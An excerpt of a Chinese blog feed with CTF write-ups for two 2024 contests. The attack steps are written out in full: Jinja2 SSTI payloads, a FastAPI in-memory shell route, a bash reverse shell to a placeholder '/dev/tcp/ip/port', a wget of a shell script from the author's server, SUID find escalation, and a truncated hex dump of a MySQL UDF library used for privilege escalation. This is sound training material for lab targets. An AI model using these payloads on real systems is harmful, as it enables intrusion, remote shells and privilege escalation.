  </entry>
  
  
  
  <entry>
    <title>2024第七届巅峰极客部分wp</title>
    <link href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h1><p>源码给了是很明显的ssti，在&#x2F;calc路由里传参calc_req，黑名单是不能有：<strong>数字、百分号、非ascii之外的字符</strong>。最烦的是这个access，原本是False，可以不用管，但是一旦成功执行一次代码，access就会变成True，这个环境就不能打了，所以我们最好还是在本地先去掉这个access，方便我们调试，先打通一遍，再打开环境尝试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/calc&quot;</span></span>)</span><br><span class="hljs-meta">@timeout_after(<span class="hljs-params"><span class="hljs-number">1</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">ssti</span>(<span class="hljs-params">calc_req: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">global</span> access<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">any</span>(char.isdigit() <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> calc_req)) <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;%&quot;</span> <span class="hljs-keyword">in</span> calc_req) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> calc_req.isascii() <span class="hljs-keyword">or</span> access:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;bad char&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        jinja2.Environment(loader=jinja2.BaseLoader()).from_string(<span class="hljs-string">f&quot;&#123;&#123;&#123;&#123; <span class="hljs-subst">&#123;calc_req&#125;</span> &#125;&#125;&#125;&#125;&quot;</span>).render(&#123;<span class="hljs-string">&quot;app&quot;</span>: app&#125;)<br>        access = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fight&quot;</span><br></code></pre></td></tr></table></figure><p>这里calc_req参数外面给了四个大括号，这意味着我们传参不需要像ssti一样再传两对大括号进去了，直接可以打payload。</p><p>这里是没给回显的，除非你有read()所以我们只能通过服务器是否爆500来判断我们的payload是否有问题。</p><p>我们先拿eval：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span><br></code></pre></td></tr></table></figure><p>这里使用 <code>.__subclasses__()</code> 后面配合 <code>[]</code> 可能更多地是选择了系统中第一个有 <code>__init__</code>、<code>__globals__</code> 的子类，因此不会导致错误。</p><p>这里还有一个拿eval的办法：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">app.<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span>.<span class="hljs-emphasis">__builtins__</span>.eval(&quot;1*1&quot;)<br></code></pre></td></tr></table></figure><p>因为代码前面app &#x3D; FastAPI()，app是FastAPI的一个对象，我们就可以直接调用app也就是FastAPI类的方法了。</p><p>拿到eval后，我们到现在这道题有两个做法：</p><p><strong>方法一：打内存马进行rce</strong></p><p>打FastAPI内存马，在FastAPI类有一个add_api_route方法，我们可以通过这个方法来增加一个路由，进行rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.add_api_route(<span class="hljs-string">&#x27;/shell&#x27;</span>, <span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read())<br></code></pre></td></tr></table></figure><p>我们需要再eval里重新获取一遍app也就是FastAPI的对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>]<br></code></pre></td></tr></table></figure><ol><li><code>sys.modules</code>：<code>sys</code> 模块中有一个名为 <code>modules</code> 的字典，它维护了所有已导入模块的当前状态。这个字典的键是模块的名称，而值是对应的模块对象。</li><li><code>modules[&#39;__main__&#39;]</code>：<code>__main__</code> 是运行 Python 程序的主模块，无论是直接从命令行运行的脚本，还是通过某个执行环境运行的代码。通过 <code>sys.modules[&#39;__main__&#39;]</code>，我们获取到了当前执行程序的主模块对象。</li><li><code>__dict__</code>：每个模块对象都有一个 <code>__dict__</code> 属性，它是一个字典，包含了模块内定义的所有全局变量和函数。</li><li><code>[&#39;app&#39;]</code>：最后，从模块的 <code>__dict__</code> 中获取名为 <code>app</code> 的对象。</li></ol><p>然后整合以下payload：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">app<span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.eval</span>(&quot;__import__(&#x27;sys&#x27;)<span class="hljs-selector-class">.modules</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__main__&#x27;</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;app&#x27;</span>]</span><span class="hljs-selector-class">.add_api_route</span>(&#x27;/shell&#x27;, lambda :__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-class">.read</span>())&quot;)<br></code></pre></td></tr></table></figure><p>现在访问&#x2F;shell就可以拿到flag了</p><p><strong>方法二：修改__file__进行任意文件读取</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-meta">@timeout_after(<span class="hljs-params"><span class="hljs-number">1</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br></code></pre></td></tr></table></figure><p>在跟路由读取了当前代码文件内容，并输出到网页上。那么如果我们能修改<code>__file__</code>为&#x2F;flag那么访问根路由就能拿到flag了。</p><p><code>__file__</code>在全局变量globals里有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;__main__&#x27;</span>],<span class="hljs-string">&#x27;__file__&#x27;</span>,<span class="hljs-string">&#x27;/flag&#x27;</span>)<br></code></pre></td></tr></table></figure><p>使用setattr(object, name, value)方法修改对象的属性值。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">object</span> <span class="hljs-comment">-- 对象。</span><br><span class="hljs-type">name</span> <span class="hljs-comment">-- 字符串，对象属性。</span><br><span class="hljs-keyword">value</span> <span class="hljs-comment">-- 属性值。</span><br></code></pre></td></tr></table></figure><blockquote><p>Q：为什么不用<code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__</code>，<code>__file__</code>明明在这里面啊？</p><p>A：因为setattr函数的第一个值是一个对象，<code>__dict__</code>是<code>__main__</code>的一个属性，并不是一个对象。</p></blockquote><p>整合一下payload：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">app.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.eval(&quot;setattr(<span class="hljs-strong">__import__</span>(&#x27;sys&#x27;).modules[&#x27;<span class="hljs-strong">__main__</span>&#x27;],&#x27;<span class="hljs-strong">__file__</span>&#x27;,&#x27;/flag&#x27;)&quot;)<br></code></pre></td></tr></table></figure><h1 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h1><p><a href="http://8.137.112.104/?p=15">http://8.137.112.104/?p=15</a></p><h1 id="admin-Test"><a href="#admin-Test" class="headerlink" title="admin_Test"></a>admin_Test</h1><p>扫后台发现&#x2F;admin.html，这里可以文件上传，并执行命令。</p><p><img src="/img/dfjk/QQ_1724744695876.png" alt="QQ_1724744695876"></p><p>但是命令执行过滤了基本所有字符，留下的只有：</p><p>命令部分fuzz出来的可用字符为t * . &#x2F;</p><p>只能执行临时文件：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">. </span>/t*/*<br></code></pre></td></tr></table></figure><p><strong>通过.(点，也就是 source命令)去执行&#x2F;tmp目录里的文件</strong></p><p><img src="/img/dfjk/67a60b82f0a64abdb24b4041531f392b.png" alt="67a60b82f0a64abdb24b4041531f392b"></p><p>flag没有权限读，尝试提权，发现find命令有suid权限：</p><p><img src="/img/dfjk/42dc5d58fe364771a2e7bb088d7266e4.png" alt="42dc5d58fe364771a2e7bb088d7266e4"></p><p>直接find执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /etc/passwd -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024春秋杯部分wp</title>
    <link href="/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/"/>
    <url>/2024/07/06/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h1><p>打开题目是?name&#x3D;hello，还回显了hello，看一下后台语言和框架</p><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706131647899.png" alt="image-20240706131647899"></p><p>一眼ssti模版注入，</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>看一下当前目录的东西：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api<span class="hljs-selector-class">.py</span> evil<span class="hljs-selector-class">.key</span> sql-proxy<span class="hljs-selector-class">.jar</span> update<span class="hljs-selector-class">.py</span> www.py<br></code></pre></td></tr></table></figure><p>api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> mysql.connector, time, threading, socket<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mysql_keepalive</span>():<br>    config = &#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;123456&#x27;</span>,<br>        <span class="hljs-string">&#x27;host&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;database&#x27;</span>: <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>        <span class="hljs-string">&#x27;port&#x27;</span>: <span class="hljs-number">6666</span>,<br><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        db_connection = mysql.connector.connect(**config)<br>        cursor = db_connection.cursor()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-built_in">print</span>(err)<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&quot;SELECT VERSION();&quot;</span>)<br>            cursor.fetchone()<br>        <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;连接中断: <span class="hljs-subst">&#123;err&#125;</span>&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client_connection</span>(<span class="hljs-params">client_socket</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket.send(<span class="hljs-string">&#x27;&#123;&quot;code&quot;:0, &quot;path&quot;: &quot;&quot;&#125;&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>            time.sleep(<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error handling client: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_api</span>():<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    port = <span class="hljs-number">7777</span><br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;update_api Listening on port <span class="hljs-subst">&#123;port&#125;</span>...&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        client_socket, addr = server_socket.accept()<br>        handle_client_connection(client_socket)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/evil&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evil</span>():<br>    code = request.json[<span class="hljs-string">&#x27;code&#x27;</span>]<br>    key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>    <span class="hljs-keyword">if</span> key == <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./evil.key&quot;</span>).read():<br>        <span class="hljs-built_in">exec</span>(code)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;key error&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    threading.Thread(target=mysql_keepalive).start()<br>    threading.Thread(target=update_api).start()<br>    app.run(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>这里有一个evil路由，可以执行root权限的命令，但是需要key，key是在evil.key文件里的，不出所料这个文件我们也是没有权限读取的。</p><p>这个文件还让我们了解了mysql服务，有账户ctf密码123456</p><p>update.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> tarfile<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_specific_file</span>(<span class="hljs-params">tar_path, file_name, extract_path</span>):<br>    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(tar_path, <span class="hljs-string">&quot;r:gz&quot;</span>) <span class="hljs-keyword">as</span> tar:<br>        file_info = tar.getmember(file_name)<br>        tar.extract(file_info, path=extract_path)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7777</span>))<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    data = s.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">try</span>:<br>        js = json.loads(data)<br>        <span class="hljs-keyword">if</span> js[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">1</span>:<br>            extract_specific_file(js[<span class="hljs-string">&#x27;path&#x27;</span>], <span class="hljs-string">&#x27;new.bin&#x27;</span>, <span class="hljs-string">&quot;/updatedir&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        s.send(<span class="hljs-string">b&#x27;Error&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这个文件给了一个解压文件的函数</p><p><a href="http://www.py/">www.py</a> 没啥看的，就是模版渲染的地方。</p><p>这道题是非预期，在brother_revenge这道题被修复了，hh所以没用上key和evil路由，打mysql udf提权</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>第一步得反弹shell，这样方便我们操作，这道题环境没有curl、nc等常用命令。（最开始curl没测出来还以为不出网&#x3D;-&#x3D;）但是这里有wget命令，我们在自己的vps上放入一个shell.sh文件。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>把这个文件用wget下载到tmp目录里：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cd /tmp;wget http://ip/shell.sh&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706132722224.png" alt="image-20240706132722224"></p><p>刚下载进去这个sh文件是没有执行权限的，我们需要给他加上执行权限</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">g.pop.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cd /tmp;chmod %2bx *&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里的命令chmod +x *为什么要把加号变成%2b呢？是因为这里加号会被url自动解码成空格，我们想用加号就必须用加号的url编码之后的形式。</p><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706133013583.png" alt="image-20240706133013583"></p><p>现在shell.sh就有了执行权限，我们先服务器起监听，然后运行这个文件bash &#x2F;tmp&#x2F;shell.sh</p><p>成功反弹shell</p><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706133147209.png" alt="image-20240706133147209"></p><h3 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h3><p>这里奉上国光师傅的文章</p><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><p>总的来说我们需要写入动态链接库，这里没有注入点，就没法用sqlmap直接写入，需要用原生mysql语句打。当 secure_file_priv 无限制的时候，我们也是可以手工写文件到 plugin 目录下的</p><p>我们先进入可交互式的mysql里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>然后ctrl+z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>mysql -uctf -p123456<br></code></pre></td></tr></table></figure><p><img src="/img/2024%E6%98%A5%E7%A7%8B%E6%9D%AF/image-20240706134812450.png" alt="image-20240706134812450"></p><p>利用这个工具<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><p>我们需要的是lib_mysqludf_sys_64.so</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b